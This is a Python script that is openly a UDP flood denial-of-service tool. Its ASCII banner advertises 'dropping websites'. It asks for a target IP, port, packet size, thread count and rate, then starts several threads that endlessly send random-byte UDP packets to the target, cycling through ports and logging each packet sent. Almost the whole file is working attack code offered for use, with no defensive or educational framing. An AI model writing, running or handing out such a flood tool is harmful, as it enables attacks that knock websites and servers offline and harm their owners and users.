#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import fade
import random
import threading
from datetime import datetime
from django.core.validators import validate_ipv46_address
from django.core.exceptions import ValidationError



LOG_FILE = "attack_log.txt"

# Logger
def log_message(message: str):
    with open(LOG_FILE, "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"[{timestamp}] {message}\n")
    print(message)
# ASCII art
os.system("clear")
logo = """
\033[34m  ██████   ██████   ████     ██\033[35m ███████\033[32m╗\033[37m ██\033[95m╗\033[91m      ██\033[34m╗ \033[32m██\033[33m╗     \033[32m██\033[33m╗
\033[34m ██       ██    ██  ██ ██    ██\033[35m ██\033[32m╔════╝\033[37m ██\033[95m║\033[91m      ██\033[34m║  \033[32m██\033[33m║   \033[32m██\033[33m║
\033[34m ██       ██    ██  ██  ██   ██\033[35m ██\033[32m║\033[37m      ██\033[95m║\033[91m      ██\033[34m║    \033[32m██\033[33m║\033[32m██\033[33m║
\033[34m ██       ██    ██  ██   ██  ██\033[35m █████\033[32m║\033[37m   ██\033[95m║\033[91m      ██\033[34m║     \033[32m██\033[33m║
\033[34m ██       ██    ██  ██    ██ ██\033[35m ██\033[32m═══╝\033[37m  ██\033[95m║\033[91m      ██\033[34m║   \033[32m██\033[33m║ \033[32m██\033[33m║
\033[34m  ██████   ██████   ██     ████\033[35m ██\033[32m║\033[37m      ███████\033[95m╗\033[91m ██\033[34m║ \033[32m██\033[33m║     \033[32m██\033[33m║
\033[33m                                \033[32m╚═╝      \033[95m╚══════╝ \033[34m╚═╝\033[33m ╚═╝      ╚═╝
╔═══════════════════════════════════════════════════════════════════╗
║\033[34m               TOOLS TO DETECT AND DROPPING WEBSITES_              \033[31m║
║\033[33m                IF IN DOUBT OF ACCURACY, PLEASE HELP               \033[31m║
║\033[91m                        BY CHECKING THE HOST                       \033[31m║
║\033[36m                             ——oO0Oo——                             \033[31m║
╚═══════════════════════════════════════════════════════════════════╝
\033[96m╔════════════════════════════════════════════════════╗
\033[96m║\033[37m  Design By: KunFayakun/github.com/kunkaffa/Conflix \033[96m║
\033[96m╚════════════════════════════════════════════════════╝
"""
# Validate target IP
def validate_ip(ip: str):
    try:
        validate_ipv46_address(ip)
        return True
    except ValidationError:
        return False

# Attack function
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            log_message(f"Thread-{threading.get_ident()}: Sent packet #{sent} to {ip}:{port}")
            port = port + 1 if port < 65534 else 1
            time.sleep(rate_limit)
    except KeyboardInterrupt:
        log_message("Attack interrupted by user.")
    except Exception as e:
        log_message(f"Error in thread {threading.get_ident()}: {e}")
    finally:
        sock.close()

# Main script execution
def main():
    os.system("clear")
    print(logo)
    ip = input(" [+] Enter Target IP: ").strip()
    if not validate_ip(ip):
        log_message("Invalid IP address provided. Exiting...")
        sys.exit(1)

    try:
        port = int(input(" [+] Enter Starting Port Number (default 80): ").strip() or 80)
        packet_size = int(input(" [+] Enter Packet Size (default 1490 bytes): ").strip() or 1490)
        threads = int(input(" [+] Enter Number of Threads (default 4): ").strip() or 4)
        rate_limit = float(input(" [+] Enter Rate Limit (seconds, default 0.01): ").strip() or 0.01)
    except ValueError:
        log_message("Invalid input provided. Exiting...")
        sys.exit(1)

    os.system("clear")
    print(logo)
    log_message(f"Starting attack on {ip}:{port} with {threads} threads.")
    print(" [+] Press Ctrl+C to stop the attack.")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, packet_size, rate_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        log_message("Attack stopped by user.")

if __name__ == "__main__":
    main()



